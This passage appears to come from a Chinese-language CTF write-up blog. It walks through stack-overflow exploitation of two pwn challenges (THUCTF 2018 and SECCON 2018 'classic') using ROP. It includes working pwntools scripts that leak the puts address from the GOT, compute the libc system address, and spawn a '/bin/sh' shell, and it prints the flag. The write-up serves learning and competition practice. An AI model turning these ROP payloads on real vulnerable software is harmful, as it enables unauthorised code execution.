(gadgets)** 来改变某些寄存器或者变量的值，从而改变程序的执行流程，达到预期利用目的 。
如果你要使用 DynELF 的思路，在本题需要采用 puts 编写 DynELF 需要的 leak 函数，再使用 ROP 调用 scanf 将
"/bin/sh" 写入 .bss 段，因为程序只加载了 puts 和 scanf 函数，会很麻烦的。
但是我们再次仔细审视程序，首先 **本题有一个 doit 函数，其中调用了 system 地址，可以直接利用** ，攻击者无需相伴去泄露 system 在
libc 中的真实地址：
第二，本题有一个非常神奇的地方，如果只阅读 F5 的 IDA 代码是无法发现的：
vul() 漏洞函数里面居然人为多了一条 `mov rdi,rsp`！这不就是将 rdi 指向了 scanf
读入的数据在内存中的第一个位置吗？！利用这一点可以很简单的实现 ROP ，因为你不需要再想办法写入 "/bin/sh\0" 到 .bss 段了！最终的
POC 如下：
    # encoding :utf-8
    from pwn import *
    buf = "/bin/sh\0" + 'A'*(8192 - 8)  
    buf += p64(0x400722)
    p = process('./stackoverflow64_withoutleak')
    # p = remote('pwn.thuctf2018.game.redbud.info', 20001)
    p.recvuntil("welcome,plz:")
    p.send(buf)
    p.interactive()
文件下载：[stackoverflow_withnoleak](https://saferman.github.io/assets/downloads/stackoverflow64_withnoleak)
### Seccon 2018 - classic
作为一名 web 狗，这道题是我第一次在比赛期间成功使用 ROP 绕过 NX 实现 PWN
的题目，非常有成就感！虽然遇到点挫折花了我一些时间，最后还踩到了一个坑以至于不得不让队里的一个大佬指点一下，但是也是因为这道题最终彻底弄懂 ROP 绕过
NX 的原理，总的来说非常让人开森 ~
首先 IDA 打开程序：
红色的出现缓冲区溢出，紫色可以确定需要的溢出空间为 (48 + 24) 个字节，这样下一个栈地址才是 main
函数执行完会执行的指令存放的位置。这里其实我是使用 gdb 动态调试得到的。
然后我们来编写我们的利用脚本（此处略去很多坑的细节）。按照前面总结的思路，我们需要先泄露 puts 函数的真实地址以此来得到 system 地址。
（1） **首先得到关于 puts 在 got 表的地址**
网上很多文章使用 ELF("./classic") 和 symbols['puts'] 得到 put_plt
地址，但是得到的不准确。因为这个地址是确定的，我们直接在 pwngdb 中调试观察：
再在 IDA 中查看这个地址，可以看到 0x601018 是我们需要泄露的地址
（2） **编写第一个 payload**
考虑到 x64 是寄存器传参，我们需要使用 ROPgadget.py 得到一个小片段汇编：
    poprdi_ret = 0x400753 # pop rdi ; ret
这样我们的第一个 payload1 的利用编写如下：
    puts_plt = 0x400520 
    vuln_addr = 0x4006A9 # 这里填写漏洞函数里面汇编第一个地址
    poprdi_ret = 0x400753 # pop rdi ; ret
    p = process('./classic', env = {'LD_PRELOAD': './libc-2.23.so'})
    address = 0x601018 # 需要泄露的地址，是 plt 这个地址写的 jmp cs:off_601018
    payload1 = 'a'*(48+24)+ p64(poprdi_ret) + p64(address) + p64(puts_plt) + p64(vuln_addr)
    p.sendline(payload1) # 自动添加 \n
这个 payload1 泄露出 address 之后，会重新开始执行 vuln_addr 漏洞函数的内容，又可以继续利用
（3） **puts 函数处理**
这是我遇到的最麻烦的事情，首先 puts 函数有这些特性：
  * 输出长度不可控
  * 在遇到 \n(0x0a) 继续输出
  * 在遇到 \0(0x00) 结束输出
  * 并且会在输出的最后添加 \n(0x0a)，相当恶心
我在尝试了很久终于写出了如何在上面 payload1 发送后成功得到争取的 puts address 的方法：
注意，在读取泄露的内容前需要读取完程序会输出的内容（payload1 是在漏洞函数结束后才执行）
    print p.recvuntil('Have a nice pwn!!\n')
    s = p.recvuntil("\n")
    data = s[:8] # 遇到 0a 很烦
    while len(data)  %s" % (address, (data or '').encode('hex'))
    data = data.replace("\n", "\0") # 把 puts 替换的 0a 全部换成 00，尤其是 上面 print 输出的末尾那些 0a 必须换！
    put_addr = u64(data) # 8 字节的字符转换为 " 地址格式 "
    print "put_addr: ", hex(put_addr)
这里说明一下，data 本来该是 puts 在 libc 中的地址，但是由于 puts 遇到 0x00 这个字节会停止，并且在末尾补上
0x0a，所以我们需要循环触发 payload1 让 puts 输出的 data 至少到 8 个字节。在大多数情况下，直接将所有 0x0a 替换为 0x00
可以得到正确的泄露地址。
然后 u64 就是把 8 字节的字符转换为 " 地址格式 "（0x401020 这种）
（4） **利用相对偏移计算 system 地址**
    # libc.so 文件作用是告诉你相对偏移！
    libc = ELF('./libc-2.23.so')
    put_libc = libc.symbols['puts']
    # print "%#x" % put_libc # 0x6f690   就是 puts 在 libc 中的偏移！
    system_libc = libc.symbols['system']
    # print "%#x" % system_libc # 0x6f690   就是 puts 在 libc 中的偏移！
    system_addr = put_addr - put_libc + system_libc
（5） **编写第二个 payload2**
    bss_addr = 0x0601060  # IDA segment ，选择 .bss 的 start 地址
    gets_plt = 0x400560   # gdb 动态调试得到，IDA 查看验证，和 put_plt 得到原理一样
    payload2 = 'a'*(48+24) + p64(poprdi_ret) + p64(bss_addr) + p64(gets_plt) + p64(poprdi_ret) + p64(bss_addr) + p64(system_addr) + p64(vuln_addr)
    p.recvuntil("Local Buffer >>")
    p.sendline(payload2)
    p.sendline('/bin/sh\0')
    p.interactive()
可以参考前面的 DynELF leak 函数分析步骤去理解 payload2 为什么这么编写，总体而言就是调用 gets 函数将后面用户输入的
"/bin/sh\0" 写入 .bss 段，然后利用一个 `pop rdi ; ret ;` 将写入的 "/bin/sh\0" 地址放入 rdi
寄存器，再调用 libc 的 system 函数得到 shell。
最终得到的 POC 就是前面双 payload 利用模板的代码，flag 是  
**SECCON{w4rm1ng_up_by_7r4d1710n4l_73chn1qu3}**
文件下载：[classic](https://saferman.github.io/assets/downloads/seccon_2018_classic.zip)
### 参考链接
[基础栈溢出复习 二 之 ROP](https://bestwing.me/2017/03/19/stack-overflow-two-ROP/)
[Memory Leak & DynELF - 在没有目标 libc.so 时进行 ROP
攻击](http://binarysec.top/post/2018-01-30-1.html)
[NX 机制及绕过策略-ROP](https://www.jianshu.com/p/f3ebf8a360f0)
[【技术分享】借助 DynELF 实现无 libc 的漏洞利用小结](https://www.anquanke.com/post/id/85129)